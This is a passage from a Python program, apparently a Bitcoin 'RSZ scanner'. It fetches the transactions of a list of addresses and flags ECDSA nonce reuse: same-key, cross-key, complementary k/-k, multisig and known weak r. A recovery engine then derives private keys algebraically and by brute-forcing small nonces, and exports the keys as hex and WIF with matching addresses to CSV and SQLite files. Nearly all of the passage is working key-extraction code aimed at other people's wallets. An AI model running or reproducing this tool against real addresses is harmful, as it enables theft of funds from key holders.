        if sig.get("sig_type") == "multisig":
            ms_groups[(sig["txid"], sig["vin"])].append(sig)

    for (txid, vin_idx), group in ms_groups.items():
        if len(group) < 2: continue
        # Check for shared r across different signers in same input
        r_to_signers: Dict[int, List[int]] = defaultdict(list)
        for sig in group:
            r_to_signers[sig["r"]].append(sig.get("signer_idx", 0))

        for r_val, signer_list in r_to_signers.items():
            unique_signers = list(set(signer_list))
            if len(unique_signers) >= 2:
                results.append({
                    "type":    "Multisig Nonce",
                    "txid":    txid,
                    "vin_idx": vin_idx,
                    "r":       hex(r_val),
                    "signers": unique_signers,
                    "risk":    (f"Signers {unique_signers} in multisig input share r — "
                                "broken RNG (Android 2013 pattern). "
                                "All co-signers' keys recoverable."),
                    "action":  "Run recovery on all co-signers.",
                })
    return results

# ==============================================================================
# PART 11: RECOVERY FORMULAS
# ==============================================================================

def modinv(a: int, m: int = N) -> int:
    try:
        return pow(a % m, -1, m)
    except ValueError:
        raise ValueError(f"modinv: {a} has no inverse mod {m} (gcd != 1)")

def verify_key(pub_hex, priv_int):
    if priv_int <= 0 or priv_int >= N: return False
    try:
        sk = ecdsa.SigningKey.from_secret_exponent(priv_int, curve=curve)
        vk = sk.verifying_key
        pt = vk.pubkey.point
        x  = pt.x().to_bytes(32, 'big')
        if pub_hex.startswith('04') and len(pub_hex) == 130:
            y  = pt.y().to_bytes(32, 'big')
            return (b'\x04' + x + y).hex() == pub_hex.lower()
        else:
            prefix = b'\x02' if pt.y() % 2 == 0 else b'\x03'
            return (prefix + x).hex() == pub_hex.lower()
    except Exception:
        return False

def attempt_bootstrap(r: int, s1: int, z1: int, s2: int, z2: int) -> List[int]:
    """Standard nonce reuse: same key, same r, two (s,z) pairs."""
    candidates = []
    for _s1 in [s1, N-s1]:
        for _s2 in [s2, N-s2]:
            if _s1 == _s2: continue
            try:
                k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
                d = ((_s1 * k - z1) * modinv(r, N)) % N
                candidates.append(d)
            except ValueError:
                pass
    return candidates

def attempt_complementary_recovery(r: int, s1: int, z1: int, s2: int, z2: int) -> List[int]:
    """Complementary nonce (k and -k give identical r but s2 = N - s1)."""
    candidates = []
    for _s1 in [s1, N-s1]:
        denom = (2 * _s1 - N) % N
        if denom == 0:
            continue
        try:
            k = ((z1 - z2) * modinv(denom, N)) % N
            d = ((_s1 * k - z1) * modinv(r, N)) % N
            candidates.append(d)
        except ValueError:
            pass
    return candidates

def attempt_chain(r: int, s_known: int, z_known: int, d_known: int, s_target: int, z_target: int) -> List[int]:
    """Chain recovery: use a known (d, s, z) to find d for another sig with same r."""
    candidates = []
    for _sk in [s_known, N-s_known]:
        try:
            k = ((z_known + r * d_known) * modinv(_sk, N)) % N
            for _st in [s_target, N-s_target]:
                d2 = ((_st * k - z_target) * modinv(r, N)) % N
                candidates.append(d2)
        except ValueError:
            pass
    return candidates

def brute_force_k(r: int, s: int, z: int, pub: str, max_k: int) -> Optional[Tuple[int, int]]:
    try:
        r_inv = modinv(r, N)
    except ValueError:
        return None
    
    s_candidates = list({s, N - s})
    
    for k in range(1, max_k + 1):
        for _s in s_candidates:
            d = ((_s * k - z) * r_inv) % N
            if d > 0 and verify_key(pub, d):
                return k, d
    return None

# ==============================================================================
# PART 12: SAVE FUNCTIONS
# ==============================================================================

def save_rnonce(vulns: List[Dict[str, Any]], address: str):
    if not vulns: return
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # Update SAVED_R_GROUPS for both Reused Nonce and Cross-Key Reuse
    for v in vulns:
        if v["type"] not in ("Reused Nonce", "Cross-Key Reuse"): continue
        r_hex = v["r"][2:] if v["r"].startswith("0x") else v["r"]
        for occ in v.get("occurrences", []):
            txid = occ.get("txid") or "N/A"
            pk   = occ.get("pubkey") or "N/A"
            key  = f"{txid}|{pk}"
            if key not in SAVED_R_GROUPS[r_hex]:
                SAVED_R_GROUPS[r_hex].append(key)

    # Human-readable file
    with open(OUTPUT_R_NONCE, "w", encoding="utf-8") as f:
        for r_hex, occ_list in SAVED_R_GROUPS.items():
            f.write("=" * 80 + "\n")
            f.write("Reused Nonce Group\n")
            f.write("=" * 80 + "\n")
            f.write(f"r: {r_hex}\n")
            f.write("Occurrences:\n")
            for key in occ_list:
                txid, pk = key.split("|")
                f.write(f" - txid={txid} pubkey={pk}\n")
            f.write("\n")

    # Parsing-friendly file
    with open(OUTPUT_R_NON, "w", encoding="utf-8") as f:
        for r_hex in SAVED_R_GROUPS:
            r_int  = int(r_hex, 16)
            group  = db_get_sigs_by_r(r_int)
            if len(group) < 2: continue
            f.write("=" * 80 + "\n")
            f.write("Reused Nonce Group\n")
            f.write("=" * 80 + "\n")
            f.write(f"r: {r_hex}\n")
            f.write("Occurrences:\n")
            seen = set()
            for item in group:
                txid = item.get("txid","N/A")
                pk   = item.get("pubkey","N/A")
                s_val = item.get("s","N/A")
                
                # Use 's' as part of the uniqueness key to ensure multiple inputs
                # from the exact same transaction are not accidentally discarded.
                key  = (txid, s_val)
                if key in seen: continue
                seen.add(key)
                
                s_hex = hex(s_val)[2:] if isinstance(s_val, int) else str(s_val)
                z_val = item.get("z_original")
                z_hex = hex(z_val)[2:] if z_val is not None else "N/A"
                f.write(f" - txid={txid} s={s_hex} z={z_hex} pubkey={pk}\n")
            f.write("\n")

# ==============================================================================
# PART 13: MAIN ANALYSIS FUNCTION
# ==============================================================================

def analyze_address(address: str) -> Optional[Dict[str, Any]]:
    global SCANNED_ADDRESSES, VULNERABLE_ADDRESSES, CURRENT_ADDRESS

    # Resume support — skip if already in DB
    if not FORCE_RESCAN and db_already_scanned(address):
        print(f"[skip] {address} already scanned (in DB)")
        return None

    CURRENT_ADDRESS = address
    SCANNED_ADDRESSES += 1
    display_stats()

    report: Dict[str, Any] = {
        "address": address,
        "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "transaction_count": 0, "signature_count": 0, "vulnerabilities": [],
    }

    txs = fetch_all_transactions(address)
    report["transaction_count"] = len(txs)
    sigs = extract_signatures(txs)
    report["signature_count"] = len(sigs)
    print(f"  Extracted {len(sigs)} signatures from {len(txs)} txs")

    # Register all sigs exclusively in DB to prevent memory leaks
    for g in sigs:
        db_insert_sig(
            address, g.get("txid",""), g.get("vin",0),
            g.get("pubkey",""), g["r"], g["s"], g.get("z_original"),
            g.get("sig_type","standard"), g.get("signer_idx",0)
        )
        
    # Commit required here so subsequent vulnerability checks can fetch these signatures
    if DB_CONN:
        DB_CONN.commit()

    vulns: List[Dict[str, Any]] = []

    # ── Run all checks ────────────────────────────────────────────────────────

    # 1. Known weak R (instant pre-filter — no math needed)
    weak_r = check_known_weak_r(sigs)
    if weak_r:
        vulns.extend(weak_r)
        VULN_COUNTS["Known Weak R"] += len(weak_r)
        print(f"  [!] {len(weak_r)} known-weak r values found for {address}")

    # 2. Standard same-key nonce reuse
    reused = check_reused_nonce_global(address, sigs)
    if reused:
        vulns.extend(reused)
        VULN_COUNTS["Reused Nonce"] += len(reused)
        print(f"  [!] {len(reused)} same-key reused nonce groups for {address}")

    # 3. Cross-key R reuse (Brengel/Rossow)
    cross = check_cross_key_r_reuse(address, sigs)
    if cross:
        vulns.extend(cross)
        VULN_COUNTS["Cross-Key Reuse"] += len(cross)
        print(f"  [!] {len(cross)} cross-key R reuse groups for {address}")

    # 4. Complementary nonce (k / -k)
    comp = check_complementary_nonce(sigs)
    if comp:
        vulns.extend(comp)
        VULN_COUNTS["Complementary Nonce"] += len(comp)
        print(f"  [!] {len(comp)} complementary nonce pairs for {address}")

    # 5. Multisig cross-signer nonce reuse
    ms = check_multisig_nonce_reuse(sigs)
    if ms:
        vulns.extend(ms)
        VULN_COUNTS["Multisig Nonce"] += len(ms)
        print(f"  [!] {len(ms)} multisig nonce reuse groups for {address}")

    if vulns:
        VULNERABLE_ADDRESSES += 1
        report["vulnerabilities"] = vulns

    REPORTS.append(report)
    save_rnonce(vulns, address)
    db_mark_address_scanned(address, len(txs), len(sigs), len(vulns))

    print(f"  [delay] 3s pause after {address}")
    time.sleep(3)
    return report

# ==============================================================================
# PART 14: CRYPTO ADDRESS UTILS (unchanged)
# ==============================================================================

def bech32_polymod(values):
    gen = [0x3b6a57b2,0x26508e6d,0x1ea119fa,0x3d4233dd,0x2a1462b3]
    chk = 1
    for v in values:
        top = chk >> 25
        chk = (chk & 0x1ffffff) << 5 ^ v
        for i in range(5):
            chk ^= gen[i] if ((top >> i) & 1) else 0
    return chk

def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_create_checksum(hrp, data):
    poly = bech32_polymod(bech32_hrp_expand(hrp) + data + [0]*6) ^ 1
    return [(poly >> 5*(5-i)) & 31 for i in range(6)]

def bech32_encode(hrp, data):
    combined = data + bech32_create_checksum(hrp, data)
    return hrp + '1' + ''.join(CHARSET[d] for d in combined)

def convertbits(data, frombits, tobits, pad=True):
    acc, bits, ret, maxv = 0, 0, [], (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits): return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits: ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        return None
    return ret

def base58_encode(b):
    ALPHA = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    x = int.from_bytes(b, "big")
    out = []
    while x > 0:
        x, rem = divmod(x, 58)
        out.append(ALPHA[rem])
    for byte in b:
        if byte == 0: out.append("1")
        else: break
    return "".join(reversed(out))

def priv_to_wif(priv_hex, compressed=True):
    priv = bytes.fromhex("80" + priv_hex)
    if compressed: priv += b"\x01"
    chk = hashlib.sha256(hashlib.sha256(priv).digest()).digest()[:4]
    return base58_encode(priv + chk)

def _is_compressed_pub(pub_hex: str) -> bool:
    """True for 02/03-prefix compressed keys; False for 04-prefix uncompressed."""
    return not (pub_hex.startswith('04') and len(pub_hex) == 130)

def pub_to_addresses(pub_hex: str):
    pub  = bytes.fromhex(pub_hex)
    sha  = hashlib.sha256(pub).digest()
    ripe = calc_ripemd160(sha)
    p2pkh = base58_encode(
        b"\x00" + ripe +
        hashlib.sha256(hashlib.sha256(b"\x00" + ripe).digest()).digest()[:4]
    )
    if not _is_compressed_pub(pub_hex):
        return p2pkh, "", ""
    wp = convertbits(ripe, 8, 5)
    p2wpkh = bech32_encode("bc", [0] + wp) if wp is not None else ""
    redeem = b"\x00\x14" + ripe
    ripe_r = calc_ripemd160(hashlib.sha256(redeem).digest())
    p2sh = base58_encode(
        b"\x05" + ripe_r +
        hashlib.sha256(hashlib.sha256(b"\x05" + ripe_r).digest()).digest()[:4]
    )
    return p2pkh, p2wpkh, p2sh

# ==============================================================================
# PART 15: RECOVERY ENGINE
# ==============================================================================

def run_recovery(input_file: str, brute_max_k: int = 0):
    global IN_RECOVERY
    IN_RECOVERY = True
    print("\n[-] Reading and Parsing File Line by Line...")
    parsed_groups = []
    current_group = None

    try:
        with open(input_file, encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                
                # Match "r: <hex>"
                if line.startswith("r:"):
                    # Save previous group if valid
                    if current_group and len(current_group["txs"]) >= 2:
                        parsed_groups.append(current_group)
                    
                    r_hex = line.split("r:")[1].strip().lower()
                    current_group = {"r": int(r_hex, 16), "txs": []}
                
                # Match " - txid=... s=... z=... pubkey=..."
                elif line.startswith("- txid=") and current_group is not None:
                    parts = line.split()
                    s_hex, z_hex, pubkey = None, None, None
                    for part in parts:
                        if part.startswith("s="): s_hex = part[2:]
                        elif part.startswith("z="): z_hex = part[2:]
                        elif part.startswith("pubkey="): pubkey = part[7:]
                    
                    if s_hex and z_hex and pubkey and z_hex != "N/A" and pubkey != "N/A":
                        current_group["txs"].append((s_hex, z_hex, pubkey))
            
            # Save the last group if valid
            if current_group and len(current_group["txs"]) >= 2:
                parsed_groups.append(current_group)
                
    except FileNotFoundError:
        print(f"[!] File '{input_file}' not found.")
        return

    print(f"[-] Loaded {len(parsed_groups)} groups for analysis.")

    # ── Global r-index: r_int -> [(s, z, pub), ...] across ALL groups ─────────
    global_r_index: Dict[int, List[Tuple[int, int, str]]] = defaultdict(list)
    for group in parsed_groups:
        for s_hex, z_hex, pub in group['txs']:
            global_r_index[group['r']].append(
                (int(s_hex, 16), int(z_hex, 16), pub.lower())
            )

    recovered_db: Dict[str, int] = {}
    method_map:   Dict[str, str] = {}
    r_map:        Dict[str, str] = {}
    stats = defaultdict(int)

    print("\n[+] STARTING RECOVERY ENGINE...")
    print("=" * 70)

    # ── Phase 1: Algebraic recovery (iterate until stable) ───────────────────
    found_something = True
    iteration = 0

    while found_something:
        iteration      += 1
        found_something = False
        print(f"\n--- Iteration {iteration}  (recovered so far: {len(recovered_db)}) ---")

        for group in parsed_groups:
            r         = group['r']
            txs       = group['txs']
            r_hex_str = hex(r)[2:]

            pub_map: Dict[str, List[Tuple[int, int]]] = {}
            for s_hex, z_hex, pub in txs:
                pub = pub.lower()
                s_i, z_i = int(s_hex, 16), int(z_hex, 16)
                if pub not in pub_map:
                    pub_map[pub] = []
                if (s_i, z_i) not in pub_map[pub]:
                    pub_map[pub].append((s_i, z_i))

            # ── 1a. Bootstrap: same pubkey, >=2 (s,z) pairs ──────────────────
            for pub, entries in pub_map.items():
                if pub in recovered_db or len(entries) < 2:
                    continue
                pairs_tested = 0
                for i in range(len(entries)):
                    if pub in recovered_db or pairs_tested > 100: break
                    for j in range(i + 1, len(entries)):
                        if pairs_tested > 100: break
                        pairs_tested += 1
                        s1, z1 = entries[i]
                        s2, z2 = entries[j]
                        for d in attempt_bootstrap(r, s1, z1, s2, z2):
                            if verify_key(pub, d):
                                recovered_db[pub] = d
                                method_map[pub]   = "bootstrap"
                                r_map[pub]        = r_hex_str
                                stats["bootstrap"] += 1
                                print(f"   [BOOTSTRAP]     {pub[:22]}...")
                                found_something = True
                                break
                        if pub in recovered_db: break

            # ── 1b. Complementary nonce: s1 + s2 == N ────────────────────────
            for pub, entries in pub_map.items():
                if pub in recovered_db or len(entries) < 2:
                    continue
                pairs_tested = 0
                for i in range(len(entries)):
                    if pub in recovered_db or pairs_tested > 1000: break
                    for j in range(i + 1, len(entries)):
                        if pairs_tested > 1000: break
                        s1, z1 = entries[i]
                        s2, z2 = entries[j]
                        if (s1 + s2) % N != 0:
                            continue
                        
                        pairs_tested += 1
                        for d in attempt_complementary_recovery(r, s1, z1, s2, z2):
                            if verify_key(pub, d):
                                recovered_db[pub] = d
                                method_map[pub]   = "complementary_nonce"
                                r_map[pub]        = r_hex_str
                                stats["complementary"] += 1
                                print(f"   [COMPLEMENTARY] {pub[:22]}... (k/-k pair)")
                                found_something = True
                                break
                        if pub in recovered_db: break

            # ── 1c. Cross-key reuse (Brengel/Rossow RAID 2018) ───────────────
            all_sigs_raw = global_r_index.get(r, [])
            seen_pubs_dedup: Dict[str, Tuple[int, int]] = {}
            for _s, _z, _p in all_sigs_raw:
                if _p not in seen_pubs_dedup:
                    seen_pubs_dedup[_p] = (_s, _z)
            all_sigs = [(_s, _z, _p) for _p, (_s, _z) in seen_pubs_dedup.items()]

            if len(all_sigs) >= 2 and all(p not in recovered_db for _, _, p in all_sigs):
                try:
                    r_inv = modinv(r, N)
                except ValueError:
                    r_inv = None

                if r_inv is not None:
                    seen_pairs: Set[Tuple[str, str]] = set()
                    found_cross_key = False
                    for i in range(len(all_sigs)):
                        if found_cross_key: break
                        s1, z1, pub1 = all_sigs[i]
                        for j in range(i + 1, len(all_sigs)):
                            if found_cross_key: break
                            s2, z2, pub2 = all_sigs[j]
                            if pub1 == pub2: continue
                            if pub1 in recovered_db and pub2 in recovered_db: continue
                            
                            pair_key = tuple(sorted([pub1, pub2]))
                            if pair_key in seen_pairs: continue
                            seen_pairs.add(pair_key)
                            
                            k_candidates: List[int] = []
                            for _s1 in [s1, N-s1]:
                                for _s2 in [s2, N-s2]:
                                    if _s1 == _s2: continue
                                    try:
                                        k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
                                        k_candidates.append(k)
                                    except ValueError:
                                        pass

                            for k in k_candidates:
                                if found_cross_key: break
                                if pub1 in recovered_db and pub2 in recovered_db: break
                                if pub1 not in recovered_db:
                                    for _s1 in [s1, N-s1]:
                                        d1 = ((_s1 * k - z1) * r_inv) % N
                                        if verify_key(pub1, d1):
                                            recovered_db[pub1] = d1
                                            method_map[pub1]   = "cross_key_reuse"
                                            r_map[pub1]        = r_hex_str
                                            stats["cross_key"] += 1
                                            print(f"   [CROSS-KEY]     {pub1[:22]}... (shared r)")
                                            found_something = True
                                            found_cross_key = True
                                            break
                                if pub2 not in recovered_db:
                                    for _s2o in [s2, N-s2]:
                                        d2 = ((_s2o * k - z2) * r_inv) % N
                                        if verify_key(pub2, d2):
                                            recovered_db[pub2] = d2
                                            method_map[pub2]   = "cross_key_reuse"
                                            r_map[pub2]        = r_hex_str
                                            stats["cross_key"] += 1
                                            print(f"   [CROSS-KEY]     {pub2[:22]}... (shared r)")
                                            found_something = True
                                            found_cross_key = True
                                            break

            # ── 1d. Chain: use a recovered key to unlock others ───────────────
            master = None
            for s, z, p in all_sigs:
                if p in recovered_db:
                    master = (s, z, recovered_db[p])
                    break
            
            if not master:
                for s_hex, z_hex, pub in txs:
                    pub = pub.lower()
                    if pub in recovered_db:
                        master = (int(s_hex, 16), int(z_hex, 16), recovered_db[pub])
                        break

            if master:
                s_k, z_k, d_k = master
                for s_t_hex, z_t_hex, pub_t in txs:
                    pub_t = pub_t.lower()
                    if pub_t in recovered_db: continue
                    s_t, z_t = int(s_t_hex, 16), int(z_t_hex, 16)
                    for d in attempt_chain(r, s_k, z_k, d_k, s_t, z_t):
                        if verify_key(pub_t, d):
                            recovered_db[pub_t] = d
                            method_map[pub_t]   = "chain"
                            r_map[pub_t]        = r_hex_str
                            stats["chain"] += 1
                            print(f"   [CHAIN]         {pub_t[:22]}...")
                            found_something = True
                            break

    # ── Phase 2: Brute-force k on remaining unrecovered keys ─────────────────
    if brute_max_k > 0:
        print(f"\n[+] BRUTE-FORCE PHASE (limit k = {brute_max_k:,})...")
        targets = []
        for idx, group in enumerate(parsed_groups):
            grp_r = group['r']
            for s_hex, z_hex, pub in group['txs']:
                pub = pub.lower()
                if pub not in recovered_db:
                    targets.append((idx, grp_r, int(s_hex, 16), int(z_hex, 16), pub))
                    break

        if targets:
            print(f"   Testing {len(targets)} group(s) concurrently...")
            import concurrent.futures
            with concurrent.futures.ProcessPoolExecutor() as ex:
                fmap = {ex.submit(brute_force_k, grp_r, s, z, pub, brute_max_k): (idx, pub)
                        for (idx, grp_r, s, z, pub) in targets}
                for future in concurrent.futures.as_completed(fmap):
                    idx, pub = fmap[future]
                    try:
                        res = future.result()
                        if res:
                            k_found, d = res
                            bf_group = parsed_groups[idx]
                            bf_r = bf_group['r']
                            bf_r_hex = hex(bf_r)[2:]
                            recovered_db[pub] = d
                            method_map[pub]   = "brute_force"
                            r_map[pub]        = bf_r_hex
                            stats["brute"] += 1
                            print(f"   [BRUTE]  k={k_found:,} -> {pub[:22]}...")

                            try:
                                bf_r_inv = modinv(bf_r, N)
                            except ValueError:
                                continue
                            for s_t_hex, z_t_hex, pub_t in bf_group['txs']:
                                pub_t = pub_t.lower()
                                if pub_t in recovered_db: continue
                                s_t, z_t = int(s_t_hex, 16), int(z_t_hex, 16)
                                d_t = ((k_found * s_t - z_t) * bf_r_inv) % N
                                if verify_key(pub_t, d_t):
                                    recovered_db[pub_t] = d_t
                                    method_map[pub_t]   = "brute_chain"
                                    r_map[pub_t]        = bf_r_hex
                                    stats["brute_chain"] += 1
                                    print(f"      +- [BRUTE-CHAIN] {pub_t[:22]}...")
                    except Exception as exc:
                        print(f"   [ERROR] {exc}")

    # ── Summary ───────────────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print(f"[+] RECOVERY COMPLETE — {len(recovered_db)} private key(s) found")
    print(f"    Bootstrap        : {stats['bootstrap']}")
    print(f"    Complementary    : {stats['complementary']}")
    print(f"    Cross-key reuse  : {stats['cross_key']}")
    print(f"    Chain            : {stats['chain']}")
    print(f"    Brute-force      : {stats['brute']}")
    print(f"    Brute-chain      : {stats['brute_chain']}")
    print("=" * 70)

    if recovered_db:
        with open(OUTPUT_CSV, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["Public Key","Private Key Hex","WIF","Type","P2PKH","P2WPKH","P2SH","Method"])
            wif_list = []
            for pub, priv_int in recovered_db.items():
                priv_hex      = hex(priv_int)[2:].zfill(64)
                is_compressed = not (pub.startswith('04') and len(pub) == 130)
                key_type      = "Compressed" if is_compressed else "Uncompressed"
                wif           = priv_to_wif(priv_hex, compressed=is_compressed)
                a1,a2,a3      = pub_to_addresses(pub)
                method        = method_map.get(pub, "unknown")
                w.writerow([pub, priv_hex, wif, key_type, a1, a2, a3, method])
                wif_list.append(wif)
                # Persist to DB
                if DB_CONN:
                    try:
                        DB_CONN.execute(
                            "INSERT OR REPLACE INTO recovered_keys VALUES (?,?,?,?,?)",
                            (pub, priv_hex, wif, method, datetime.now().isoformat())
                        )
                        DB_CONN.commit()
                    except Exception:
                        pass
        with open(OUTPUT_WIF, "w") as f:
            f.write("\n".join(wif_list))
        print(f"  Saved -> {OUTPUT_CSV}")
        print(f"  Saved -> {OUTPUT_WIF}")
        print(f"  Saved -> {OUTPUT_DB}")
    else:
        print("  No keys recovered.")

# ==============================================================================
# PART 16: INPUT HELPERS & MAIN
# ==============================================================================

def get_input_file() -> str:
    while True:
        p = input("Enter path to BTC addresses file (one per line): ").strip().strip('"\'')
        if os.path.isfile(p): return p
        print(f"  File not found: {p}")

def get_transaction_limit() -> int:
    while True:
        s = input("Max transactions per address (0 = no limit): ").strip()
        try:
            v = int(s)
            if v >= 0: return v
        except ValueError: pass
        print("  Please enter a valid non-negative integer.")

def get_k_brute_force_setting() -> int:
    while True:
        s = input("K-value brute force limit (0 to disable, e.g. 10000): ").strip()
        if not s: return 0
        try:
            v = int(s)
            if v >= 0: return v
        except ValueError: pass
        print("  Please enter a valid non-negative integer.")

def main():
    global TOTAL_ADDRESSES, MAX_TRANSACTIONS, BRUTE_MAX_K, DB_CONN, FORCE_RESCAN
    try:
        DB_CONN = init_db()
        print(f"[db] SQLite database: {OUTPUT_DB}")

        parser = argparse.ArgumentParser(description="VPK Bitcoin RSZ Scanner (Legacy + SegWit + Native + Multisig) v4.0")
        parser.add_argument("-i", "--input", type=str, help="Path to BTC addresses file (one per line)")
        parser.add_argument("-t", "--tx-limit", type=int, default=None, help="Max transactions per address (0 = no limit)")
        parser.add_argument("-k", "--k-limit", type=int, default=None, help="K-value brute force limit (0 to disable)")
        parser.add_argument("-f", "--force", action="store_true", help="Ignore DB and force rescan of previously scanned addresses")
        
        args = parser.parse_args() if len(sys.argv) > 1 else None

        if args and args.input:
            addr_file = args.input
            if not os.path.isfile(addr_file):
                print(f"[!] Invalid or missing input file: {addr_file}")
                sys.exit(1)
        else:
            addr_file = get_input_file()

        if args and args.tx_limit is not None:
            MAX_TRANSACTIONS = args.tx_limit
        else:
            MAX_TRANSACTIONS = get_transaction_limit()

        if args and args.k_limit is not None:
            BRUTE_MAX_K = args.k_limit
        else:
            BRUTE_MAX_K = get_k_brute_force_setting()

        FORCE_RESCAN = args.force if args else False

        with open(addr_file, encoding="utf-8") as f:
            addresses = [ln.strip() for ln in f if ln.strip()]
        # Deduplicate while preserving order
        seen_a = set()
        addresses = [a for a in addresses if not (a in seen_a or seen_a.add(a))]
        TOTAL_ADDRESSES = len(addresses)

        print(f"\n[*] Loaded {TOTAL_ADDRESSES} unique addresses.")
        print("[*] Press Ctrl+C at any time to stop and trigger recovery.\n")

        for addr in addresses:
            if EXIT_FLAG:
                print(f"\n[!] Force-stop at: {addr}")
                break
            analyze_address(addr)

        print("\n" + "="*80)
        print("SCAN COMPLETE. STARTING RECOVERY MODULE…")
        print("="*80 + "\n")
        run_recovery(OUTPUT_R_NON, brute_max_k=BRUTE_MAX_K)

    except KeyboardInterrupt:
        print("\n\n[!] Interrupted — running recovery on available data…")
        run_recovery(OUTPUT_R_NON, brute_max_k=BRUTE_MAX_K)
        sys.exit(0)
    finally:
        if DB_CONN:
            DB_CONN.close()

if __name__ == "__main__":
    main()
